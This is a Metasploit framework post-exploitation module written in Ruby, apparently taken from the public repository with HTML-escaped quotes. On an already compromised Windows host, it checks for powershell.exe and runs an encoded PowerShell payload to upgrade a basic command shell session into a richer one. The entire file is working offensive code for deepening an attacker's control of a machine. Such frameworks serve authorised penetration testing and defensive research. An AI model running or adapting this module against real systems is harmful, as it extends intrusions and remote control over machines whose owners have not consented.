# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/powershell&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::Powershell
  include Post::File

  def initialize(info={})
    super( update_info( info,
        &#039;Name&#039;          => &#039;Windows Command Shell Upgrade (Powershell)&#039;,
        &#039;Description&#039;   => %q{
          This module executes Powershell to upgrade a Windows Shell session
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [
            &#039;Ben Campbell <eat_meatballs[at]hotmail.co.uk>&#039;
          ],
        &#039;DefaultOptions&#039; =>
            {
                &#039;WfsDelay&#039;     => 10,
            },
        &#039;DisclosureDate&#039; => &#039;Jan 01 1999&#039;,
        &#039;Platform&#039;      => [ &#039;win&#039; ],
        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
        &#039;Targets&#039; => [ [ &#039;Universal&#039;, {} ] ],
        &#039;DefaultTarget&#039; => 0
      ))
  end

  def exploit
    psh_path = "\\WindowsPowerShell\\v1.0\\powershell.exe"

    if file? "%WINDIR%\\System32#{psh_path}"
      print_status("Executing powershell command line...")
      cmd_exec(cmd_psh_payload(payload.encoded))
    else
      fail_with(Exploit::Failure::NotVulnerable, "No powershell available.")
    end
  end

end

